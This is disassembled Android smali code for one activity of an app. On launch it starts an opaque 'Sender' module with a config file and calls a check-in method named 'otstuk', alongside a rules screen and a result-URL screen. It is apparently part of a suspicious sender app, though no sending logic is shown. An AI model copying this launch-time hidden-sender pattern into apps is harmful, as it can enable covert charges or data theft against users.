.class public Ljp/bravo/honda/DobraKorzina;
.super Landroid/app/Activity;
.source "DobraKorzina.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Ljp/bravo/honda/DobraKorzina$UITimer;
    }
.end annotation


# instance fields
.field private final ID_MENU_EXIT:I

.field private button:Landroid/widget/Button;

.field private button2:Landroid/widget/Button;

.field private button3:Landroid/widget/Button;

.field public handler:Landroid/os/Handler;

.field private progressBar:Landroid/widget/ProgressBar;

.field private resulturl:Landroid/widget/TextView;

.field private runMethod:Ljava/lang/Runnable;

.field private testsend:Lcom/uniplugin/sender/Sender;

.field private textbelow:Landroid/widget/TextView;

.field private textpredl:Landroid/widget/TextView;

.field private timer:Ljp/bravo/honda/DobraKorzina$UITimer;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 28
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 30
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Ljp/bravo/honda/DobraKorzina;->handler:Landroid/os/Handler;

    .line 31
    new-instance v0, Ljp/bravo/honda/DobraKorzina$1;

    invoke-direct {v0, p0}, Ljp/bravo/honda/DobraKorzina$1;-><init>(Ljp/bravo/honda/DobraKorzina;)V

    iput-object v0, p0, Ljp/bravo/honda/DobraKorzina;->runMethod:Ljava/lang/Runnable;

    .line 48
    const/4 v0, 0x1

    iput v0, p0, Ljp/bravo/honda/DobraKorzina;->ID_MENU_EXIT:I

    .line 28
    return-void
.end method

.method static synthetic access$0(Ljp/bravo/honda/DobraKorzina;)Landroid/widget/ProgressBar;
    .locals 1

    .prologue
    .line 29
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->progressBar:Landroid/widget/ProgressBar;

    return-object v0
.end method

.method static synthetic access$1(Ljp/bravo/honda/DobraKorzina;)Ljp/bravo/honda/DobraKorzina$UITimer;
    .locals 1

    .prologue
    .line 45
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->timer:Ljp/bravo/honda/DobraKorzina$UITimer;

    return-object v0
.end method

.method static synthetic access$2(Ljp/bravo/honda/DobraKorzina;)Landroid/widget/Button;
    .locals 1

    .prologue
    .line 46
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->button:Landroid/widget/Button;

    return-object v0
.end method

.method static synthetic access$3(Ljp/bravo/honda/DobraKorzina;)Landroid/widget/TextView;
    .locals 1

    .prologue
    .line 47
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->textbelow:Landroid/widget/TextView;

    return-object v0
.end method

.method static synthetic access$4(Ljp/bravo/honda/DobraKorzina;)Landroid/widget/TextView;
    .locals 1

    .prologue
    .line 53
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->textpredl:Landroid/widget/TextView;

    return-object v0
.end method

.method static synthetic access$5(Ljp/bravo/honda/DobraKorzina;)Lcom/uniplugin/sender/Sender;
    .locals 1

    .prologue
    .line 49
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->testsend:Lcom/uniplugin/sender/Sender;

    return-object v0
.end method

.method private getasset(Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p1, "path"    # Ljava/lang/String;

    .prologue
    .line 118
    const/4 v5, 0x0

    .line 119
    .local v5, "outString":Ljava/lang/String;
    invoke-virtual {p0}, Ljp/bravo/honda/DobraKorzina;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v0

    .line 121
    .local v0, "am":Landroid/content/res/AssetManager;
    :try_start_0
    invoke-virtual {v0, p1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v3

    .line 122
    .local v3, "is":Ljava/io/InputStream;
    invoke-virtual {v3}, Ljava/io/InputStream;->available()I

    move-result v4

    .line 123
    .local v4, "length":I
    new-array v1, v4, [B

    .line 124
    .local v1, "data":[B
    invoke-virtual {v3, v1}, Ljava/io/InputStream;->read([B)I

    .line 125
    new-instance v6, Ljava/lang/String;

    invoke-direct {v6, v1}, Ljava/lang/String;-><init>([B)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .end local v5    # "outString":Ljava/lang/String;
    .local v6, "outString":Ljava/lang/String;
    move-object v5, v6

    .line 130
    .end local v1    # "data":[B
    .end local v3    # "is":Ljava/io/InputStream;
    .end local v4    # "length":I
    .end local v6    # "outString":Ljava/lang/String;
    .restart local v5    # "outString":Ljava/lang/String;
    :goto_0
    return-object v5

    .line 126
    :catch_0
    move-exception v2

    .line 127
    .local v2, "e1":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 0
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 69
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 70
    invoke-virtual {p0}, Ljp/bravo/honda/DobraKorzina;->setstartdisplay()V

    .line 71
    return-void
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 3
    .param p1, "menu"    # Landroid/view/Menu;

    .prologue
    const/4 v2, 0x1

    const/4 v1, 0x0

    .line 58
    const-string v0, "\u041f\u0440\u0430\u0432\u0438\u043b\u0430"

    invoke-interface {p1, v1, v2, v1, v0}, Landroid/view/Menu;->add(IIILjava/lang/CharSequence;)Landroid/view/MenuItem;

    .line 59
    return v2
.end method

.method public onOptionsItemSelected(Landroid/view/MenuItem;)Z
    .locals 1
    .param p1, "item"    # Landroid/view/MenuItem;

    .prologue
    .line 63
    invoke-virtual {p0}, Ljp/bravo/honda/DobraKorzina;->setroolsdisplay()V

    .line 64
    const/4 v0, 0x1

    return v0
.end method

.method public setresultdisplay()V
    .locals 2

    .prologue
    .line 133
    const v0, 0x7f030001

    invoke-virtual {p0, v0}, Ljp/bravo/honda/DobraKorzina;->setContentView(I)V

    .line 134
    const v0, 0x7f070007

    invoke-virtual {p0, v0}, Ljp/bravo/honda/DobraKorzina;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Ljp/bravo/honda/DobraKorzina;->button2:Landroid/widget/Button;

    .line 135
    const v0, 0x7f070006

    invoke-virtual {p0, v0}, Ljp/bravo/honda/DobraKorzina;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Ljp/bravo/honda/DobraKorzina;->resulturl:Landroid/widget/TextView;

    .line 136
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->resulturl:Landroid/widget/TextView;

    iget-object v1, p0, Ljp/bravo/honda/DobraKorzina;->testsend:Lcom/uniplugin/sender/Sender;

    iget-object v1, v1, Lcom/uniplugin/sender/Sender;->resulturl:Ljava/lang/String;

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 137
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->button2:Landroid/widget/Button;

    new-instance v1, Ljp/bravo/honda/DobraKorzina$5;

    invoke-direct {v1, p0}, Ljp/bravo/honda/DobraKorzina$5;-><init>(Ljp/bravo/honda/DobraKorzina;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 144
    return-void
.end method

.method public setroolsdisplay()V
    .locals 4

    .prologue
    .line 103
    const v2, 0x7f030002

    invoke-virtual {p0, v2}, Ljp/bravo/honda/DobraKorzina;->setContentView(I)V

    .line 104
    const v2, 0x7f07000b

    invoke-virtual {p0, v2}, Ljp/bravo/honda/DobraKorzina;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/Button;

    iput-object v2, p0, Ljp/bravo/honda/DobraKorzina;->button3:Landroid/widget/Button;

    .line 105
    const-string v2, "rools.txt"

    invoke-direct {p0, v2}, Ljp/bravo/honda/DobraKorzina;->getasset(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 106
    .local v1, "rooools":Ljava/lang/String;
    const v2, 0x7f07000a

    invoke-virtual {p0, v2}, Ljp/bravo/honda/DobraKorzina;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    .line 107
    .local v0, "roolstext":Landroid/widget/TextView;
    invoke-static {v1}, Landroid/text/Html;->fromHtml(Ljava/lang/String;)Landroid/text/Spanned;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 108
    iget-object v2, p0, Ljp/bravo/honda/DobraKorzina;->button3:Landroid/widget/Button;

    new-instance v3, Ljp/bravo/honda/DobraKorzina$4;

    invoke-direct {v3, p0}, Ljp/bravo/honda/DobraKorzina$4;-><init>(Ljp/bravo/honda/DobraKorzina;)V

    invoke-virtual {v2, v3}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 115
    return-void
.end method

.method public setstartdisplay()V
    .locals 4

    .prologue
    .line 73
    const/high16 v0, 0x7f030000

    invoke-virtual {p0, v0}, Ljp/bravo/honda/DobraKorzina;->setContentView(I)V

    .line 75
    new-instance v0, Lcom/uniplugin/sender/Sender;

    invoke-direct {v0}, Lcom/uniplugin/sender/Sender;-><init>()V

    iput-object v0, p0, Ljp/bravo/honda/DobraKorzina;->testsend:Lcom/uniplugin/sender/Sender;

    .line 76
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->testsend:Lcom/uniplugin/sender/Sender;

    invoke-virtual {p0}, Ljp/bravo/honda/DobraKorzina;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "conf.txt"

    const/4 v3, 0x1

    invoke-virtual {v0, v1, v2, v3}, Lcom/uniplugin/sender/Sender;->SenderStart(Landroid/content/Context;Ljava/lang/String;I)V

    .line 77
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->testsend:Lcom/uniplugin/sender/Sender;

    invoke-virtual {v0}, Lcom/uniplugin/sender/Sender;->otstuk()V

    .line 78
    const v0, 0x7f070002

    invoke-virtual {p0, v0}, Ljp/bravo/honda/DobraKorzina;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ProgressBar;

    iput-object v0, p0, Ljp/bravo/honda/DobraKorzina;->progressBar:Landroid/widget/ProgressBar;

    .line 79
    const v0, 0x7f070003

    invoke-virtual {p0, v0}, Ljp/bravo/honda/DobraKorzina;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    iput-object v0, p0, Ljp/bravo/honda/DobraKorzina;->button:Landroid/widget/Button;

    .line 80
    const v0, 0x7f070004

    invoke-virtual {p0, v0}, Ljp/bravo/honda/DobraKorzina;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Ljp/bravo/honda/DobraKorzina;->textbelow:Landroid/widget/TextView;

    .line 81
    const v0, 0x7f070001

    invoke-virtual {p0, v0}, Ljp/bravo/honda/DobraKorzina;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    iput-object v0, p0, Ljp/bravo/honda/DobraKorzina;->textpredl:Landroid/widget/TextView;

    .line 82
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->button:Landroid/widget/Button;

    new-instance v1, Ljp/bravo/honda/DobraKorzina$2;

    invoke-direct {v1, p0}, Ljp/bravo/honda/DobraKorzina$2;-><init>(Ljp/bravo/honda/DobraKorzina;)V

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 90
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->textbelow:Landroid/widget/TextView;

    new-instance v1, Ljp/bravo/honda/DobraKorzina$3;

    invoke-direct {v1, p0}, Ljp/bravo/honda/DobraKorzina$3;-><init>(Ljp/bravo/honda/DobraKorzina;)V

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 97
    new-instance v0, Ljp/bravo/honda/DobraKorzina$UITimer;

    iget-object v1, p0, Ljp/bravo/honda/DobraKorzina;->handler:Landroid/os/Handler;

    iget-object v2, p0, Ljp/bravo/honda/DobraKorzina;->runMethod:Ljava/lang/Runnable;

    const/16 v3, 0xfa

    invoke-direct {v0, p0, v1, v2, v3}, Ljp/bravo/honda/DobraKorzina$UITimer;-><init>(Ljp/bravo/honda/DobraKorzina;Landroid/os/Handler;Ljava/lang/Runnable;I)V

    iput-object v0, p0, Ljp/bravo/honda/DobraKorzina;->timer:Ljp/bravo/honda/DobraKorzina$UITimer;

    .line 98
    iget-object v0, p0, Ljp/bravo/honda/DobraKorzina;->timer:Ljp/bravo/honda/DobraKorzina$UITimer;

    invoke-virtual {v0}, Ljp/bravo/honda/DobraKorzina$UITimer;->start()V

    .line 101
    return-void
.end method
